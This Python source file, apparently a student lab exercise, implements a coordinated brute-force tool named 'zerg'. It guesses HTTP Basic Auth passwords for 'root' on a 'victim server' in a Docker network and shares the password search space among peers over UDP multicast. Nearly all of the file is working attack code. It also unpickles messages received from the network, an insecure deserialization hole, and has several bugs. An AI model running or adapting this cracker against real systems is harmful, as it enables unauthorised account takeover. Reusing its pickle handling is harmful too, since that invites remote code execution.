#Definitely not a botnet
from const import *
import base64
import socket
import struct
import selectors
import time
import string
import pickle
import copy
import datetime

BASE62 = string.ascii_lowercase+string.ascii_uppercase+string.digits

def encode(num, alphabet):
    """Encode a positive number into Base X and return the string.1
    Arguments:
    - `num`: The number to encode
    - `alphabet`: The alphabet to use for encoding
    """
    if num == 0:
        return alphabet[0]
    arr = []
    arr_append = arr.append  # Extract bound-method for faster access.
    _divmod = divmod  # Access to locals is faster.
    base = len(alphabet)
    while num:
        num, rem = _divmod(num, base)
        arr_append(alphabet[rem])
    arr.reverse()
    return ''.join(arr)


def decode(password, alphabet=BASE62):
    """Decode a Base X encoded password into the number

    Arguments:
    - `password`: The encoded password
    - `alphabet`: The alphabet to use for decoding
    """
    base = len(alphabet)
    strlen = len(password)
    num = 0

    idx = 0
    for char in password:
        power = (strlen - (idx + 1))
        num += alphabet.index(char) * (base ** power)
        idx += 1
    return num

# Source: https://stackoverflow.com/questions/1119722/base-62-conversion
# Why are we using this: encoding our passwords as base62 enables us to use an integer to refer to any of the possible combinations
# of alphanumeric characters - this way, we do not need to generate all the possible passwords and store them in memory to then access
# via array index, but just get a random int number (in a range of course, that hasnt been used by peers) and then decode it into a
# password
# ======================================================================================================================================================================================

# UTILITY FUNCTIONS:

def getPWfromIDX(idx, size: int = PASSWORD_SIZE):
    #print("size:",size)
    if 0 > idx or idx >= (62**size):
        print("Idx not in range!")
        print("idx:",idx)
        print("range:",62**size)
        return "a"
    str = encode(idx, BASE62)
    if len(str) < size:
        diff = size - len(str)
        for i in range(diff):
            str = BASE62[0] + str
    return str

def overlaps(r1 : list, r2 : list):
    if r1[0] <= r2[1] and r1[1] >= r2[0]: return True
    else: return False

def mergeList(listt):
    '''Smoothes out the Verified array, removing duplicates and merging adjacent arrays'''
    listt.sort()
    changed = True
    while changed:
        changed = False
        for i in range(1,len(listt)):
            if overlaps(listt[i],listt[i-1]):
                maxR = max(listt[i][1],listt[i-1][1])
                newRange = [listt[i-1][0], maxR]
                del listt[i-1]
                del listt[i-1]
                listt.append(newRange)
                changed = True
                listt.sort()
                break
            elif listt[i-1][1]+1 == listt[i][0]:
                newRange = [listt[i-1][0], listt[i][1]]
                del listt[i-1]
                del listt[i-1]
                listt.append(newRange)
                changed = True
                listt.sort()
                break
    listt.sort()
    return listt

def invertRangeList(listt):
    listt = mergeList(listt)
    MAX = 62**PASSWORD_SIZE
    if len(listt) == 0: return [0, MAX]
    elif len(listt) == 1:
        if listt[0][0] == 0: return [[listt[0][1]+1, MAX]]
        elif listt[0][1] == MAX: return [[0, listt[0][0]-1]]
        else: return[[0,listt[0][0]-1],[listt[0][1]+1,MAX]]
    else:
        newlistt = []
        for i in range(len(listt)):
            if i == 0:
                if listt[i][0] == 0: continue
                else: newlistt.append([0, listt[i][0]-1])
            else:
                newlistt.append([listt[i-1][1]+1,listt[i][0]-1])
                if i == len(listt)-1: 
                    if not listt[i][1] == MAX:
                        newlistt.append([listt[i][1]+1,MAX])  
    return newlistt

def compareAddr(myAddr : str, theirAddr : str):
        myFields = myAddr.split(".")
        theirFields = theirAddr.split(".")
        for i in range(4):
            myF = int(myFields[i])
            theirF = int(theirFields[i])
            if myF == theirF: continue
            elif myF > theirF: return 1
            else: return -1
        return 0 

def contains(r1 : list, r2 : list):
    if r1[0]<=r2[0] and r2[1]<=r1[1]:
        return True
    return False

class zerg:
    def __init__(self, name: str = ""):

        # --Init Variables n stuff we'll need----
        self.sel = selectors.DefaultSelector()
        self.name = name
        self.found = False

        # --Things for communication with victim server (HTTP,TCP)---
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.HOST = "172.17.0.2"  # "host.docker.internal"
        self.PORT = 8000

        # ---Things for communication with brood (Multicast via udp)--
        self.mCastSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.mCastSock.settimeout(0.2)
        self.MCAST_TTL = struct.pack('b', 1)
        self.MCAST_GRP ='224.3.29.71'  # what we put here
        self.MCAST_PORT = 10000

        server_address = ('', 10000)
        self.mCastSock.bind(server_address)
        group = socket.inet_aton(self.MCAST_GRP)
        mreq = struct.pack('4sL', group, socket.INADDR_ANY)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_ADD_MEMBERSHIP, mreq)
        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_LOOP, 0)
        # Listen for socket activity
        self.sel.register(self.mCastSock, selectors.EVENT_READ, self.recvMCAST)

        self.range = [0,30*PASSWORD_SIZE-1]
        self.current = self.range[0]-1
        self.verified = []
        self.peers = {}

        self.latest_pws = list()
        self.lastTry=0
        self.connect()

        hostname = socket.gethostname()
        self.address = socket.gethostbyname(hostname)
        print("I AM:",self.address)

    def isVerified(self, num : int):
        '''See if password has been tested before'''
        for i in range(len(self.verified)):
            if self.verified[i][0] >= num >= self.verified[i][1]: return True
        return False
    
    def isRangeVerified(self):
        '''See if range of passwords have been tested before'''
        for i in range(len(self.verified)):
            if contains(self.verified[i],self.range):
                return True
        return False

    def updateVerified(self):
        '''Smoothes out the Verified array, removing duplicates and merging adjacent arrays'''
        self.verified = mergeList(self.verified)

    def addToVerified(self, num):
        '''Insert a new num into verified - it'll be merged later'''
        self.verified.append([num, num])
        self.updateVerified()  # merges the mess we've created

    def selectNewRange(self):
        # firstly, tries to find any space not occupied by another slave
        self.updateVerified()
        allOccupied = copy.deepcopy(self.verified)
        for peer in self.peers.keys():
            allOccupied.append(self.peers[peer][1])
        allOccupied = mergeList(allOccupied)
        if allOccupied[0][1]-allOccupied[0][0] != 62**PASSWORD_SIZE:
            # a space without an active slave exists! -> immediately occupies the biggest space like this
            invert = invertRangeList(allOccupied)
            betterIDX = -1
            betterRNG = 62**PASSWORD_SIZE+1
            for i in range(len(invert)):
                RNG = invert[i][1]-invert[i][0]
                if RNG < betterRNG:
                    betterRNG = RNG
                    betterIDX = i

            if betterRNG > 30*PASSWORD_SIZE:
                return [invert[betterIDX][0],invert[betterIDX][0]+30*PASSWORD_SIZE-1]
            else:
                return invert[betterIDX]
        else:
            # all spaces are occupied by slaves or already checked -> choses the peer with the biggest workload, and divides it
            
            betterPeer = -1
            betterRNG = 0
            for peer in self.peers.keys():
                RNG = self.peers[peer][1][1]-self.peers[peer][1][0]
                if RNG > betterRNG:
                    betterRNG = RNG
                    betterPeer = peer
            low = int((self.peers[betterPeer][1][1] - self.peers[betterPeer][1][0])/2)
            return [low,self.peers[betterPeer][1][1]]

    def sayHello(self):                             # Peer joins the group
        '''Get a hello message'''  # Hello there
        msg = {
            'command': 'hello'
        }
        encodedMSG = pickle.dumps(msg)

        # Send the Hello message to peers (via Multicast)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))

    def sayImHere(self):                           
        '''Get a imhere message'''  # General Kenobi
        msg = {
            'command': 'imhere',
            'verified': self.verified,  # twitter famous
            'range': self.range,
        }
        encodedMSG = pickle.dumps(msg)
        
        # Send the ImHere message to peers (via Multicast)
        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))

    def sayFoundPW(self):
        '''Get a foundpw message'''  # Win
        msg = {
            'command': 'foundpw',
            'pw': self.pw
        }
        encodedMSG = pickle.dumps(msg)

        self.mCastSock.setsockopt(
            socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(encodedMSG, (self.MCAST_GRP, self.MCAST_PORT))
        
    
    def sendMCAST(self, msg):
        '''Send a message to our peers'''
        self.mCastSock.setsockopt(socket.IPPROTO_IP, socket.IP_MULTICAST_TTL, self.MCAST_TTL)
        self.mCastSock.sendto(msg, (self.MCAST_GRP, self.MCAST_PORT))
        while True:
            try:
                data, server = self.mcastSock.recvfrom(1024)
            except socket.timeout:
                print("timed out, no more responses.")
                break
            else:
                if server not in self.peers.keys():     # New peer, add them to our contact book
                    self.peers[server]=[-1,[0,0]]


    def recvMCAST(self):
        '''Receive messages from our peers (and process them)'''
        try:
            data, server = self.mCastSock.recvfrom(1024)
        except socket.timeout:
            #print("Slave",self.name+":","timed out, no more responses.") Silent peer
            return
        else:
            recvMSG = pickle.loads(data) 
            if server in self.peers:
                self.peers[server]=[time.time(),self.peers[server][1]] # last seen at: now
            else:
                self.peers[server]=[time.time(),[0,0]]  # New peer
            if recvMSG['command']=='hello':
                self.sayImHere()                        # Answer Hello with ImHere
            elif recvMSG['command']=='imhere':
                # Sort out stored ranges and verified pwds
                peerRange = recvMSG['range']
                self.peers[server][1] = peerRange
                peerVerified = recvMSG['verified']

                for range in peerVerified:
                    self.verified.append(range)
                self.updateVerified()

                if overlaps(self.range,peerRange):
                    #There's a range overlap!
                    if compareAddr(self.address,server[0]) > 0:
                        #I need to adjust my range if my ip is lower than the peer
                        self.range = self.selectNewRange()
                        self.current = self.range[0]-1

            elif recvMSG['command']=='foundpw':
                print("Password found:",recvMSG["pw"]+"!","Shutting down...")
                exit(0) # Shutting down...
            return

    def connect(self):
        """Connect to chat server and setup stdin flags."""
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((self.HOST, self.PORT))

    def try_pw(self, pw: str):
        """Creates the AuthHeader with the created pw"""  
        ID = "root"

        authHead = ID+":"+pw
        authHeadB64 = base64.b64encode(authHead.encode()).decode()

        httpHeader = f'''GET / HTTP/1.1\nHost: localhost\nAuthorization: Basic {authHeadB64}\r\n\r\n'''  

        msg = httpHeader
        self.send_msg(msg)

    def send_msg(self, msg):
        """Sends ONE (1) message to VICTIM"""  
        encoded_msg = str(msg).encode("utf-8")
        self.s.send(encoded_msg)
        self.server_response()

    def victory(self):
        '''Receive the success.jpg picture'''
        picture_raw=b""
        pic_part=b""
        incoming_parts=b""
        while True:
            while not b"\r\n" in incoming_parts:
                #Get the size of next chunk
                incoming_parts = incoming_parts+self.s.recv(1)  # Byte a Byte enche a galinha o papo
                if incoming_parts == b"":
                    # End of message
                    print("Picture received!")
                    with open("success.jpg", "wb") as img:
                        img.write(picture_raw)
                    return
            size=incoming_parts.split(b"\r\n")[0]               # Remove pesky chunked line separators
            size=int(size,16)
            incoming_parts = (self.s.recv(int(size)+2))         # +2 to account for the line separators
            incoming_parts=incoming_parts[:-2]                  # these are not the bytes you're looking for

            picture_raw=picture_raw+incoming_parts
            incoming_parts=b""

       
    def server_response(self):
        """Receives ONE (1) http response"""
        incoming = ""
        incoming_raw=b""
        while not "\r\n\r\n" in incoming:
            incoming_parts = self.s.recv(500)
            incoming_raw=incoming_raw+incoming_parts
            incoming = incoming_raw.decode("ascii")

        if '200' in incoming.split("\r\n\r\n")[0]:              # Success!
            self.found = True
            self.pw = getPWfromIDX(self.current, PASSWORD_SIZE)
            print("GOT IT!\nwas it "+self.pw+"?")
            self.sayFoundPW()
            self.victory()                                      # Process the picture

    def loop(self):
        '''Main Loop'''
        while not self.found:                                   # We exit manually but doesn't hurt
            if self.isRangeVerified():                          # Range is overlapping
                self.range = self.selectNewRange()
                self.current = self.range[0]-1
            if time.time()>self.lastTry + COOLDOWN_TIME/1000:   # If Cooldown Time has passed since last try
                print("all your base are belong to us")         # nice ref :D
                print(time.ctime(time.time()),": MY RANGE =",self.range)
                toTest = []
                full = False
                for i in range(MIN_TRIES):                      # get next MIN_TRIES passwords from ids
                    self.current += 1
                    if self.current > self.range[1]:
                        full = True
                        break
                    if self.isVerified(self.current): continue
                    self.try_pw(getPWfromIDX(self.current, PASSWORD_SIZE))
                    print("TRIED:",self.current+1)
                    self.addToVerified(self.current)
                    if self.found:
                        return getPWfromIDX(self.current, PASSWORD_SIZE)
                self.lastTry = time.time()
                self.sayImHere()
                #print(time.ctime(time.time()),": VERIFIED =",self.verified)
                if full:
                    #print("Reached the end of my rope! Choosing a new range.")
                    # print("\n\nNEW RANGE!")
                    self.range = self.selectNewRange()
                    # print("Decided on:",self.range,"\n\n")
                    self.current = self.range[0]-1
                    #print("IMHERE RESULT: New range:",self.range,"Starting from:",self.current,"\n\n")
                    pass

            # The usual method for event treatment

            #print("current peers: ",self.peers)
            for peer in self.peers.keys():
                #print("old time: ",self.peers[peer][0])
                #print("new time: ",time.time() - 5)
                if self.peers[peer][0] < time.time() - 5 and time.time() - 15!=0 :
                    #print("took too long bye")
                    self.peers.pop(peer)
                    break
            toDo = self.sel.select(0)
            for event, data in toDo:
                callback = event.data
                msg = callback()

slave = zerg("Brood1")
slave.loop()
